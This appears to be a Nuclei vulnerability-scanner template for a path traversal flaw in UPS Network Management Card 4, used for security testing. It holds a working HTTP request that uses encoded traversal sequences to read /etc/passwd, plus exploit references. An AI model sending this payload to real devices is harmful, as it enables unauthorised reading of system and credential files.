# Nuclei Template: UPS Network Management Card 4 Path Traversal
**Template ID:** ups-network-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`ups-network-lfi.yaml`)

## Vulnerability Information & PoC

## Description
UPS Network Management Card version 4 suffers from a path traversal vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

## References
- https://packetstormsecurity.com/files/177626/upsnmc4-traversal.txt
- https://www.exploit-db.com/exploits/51897
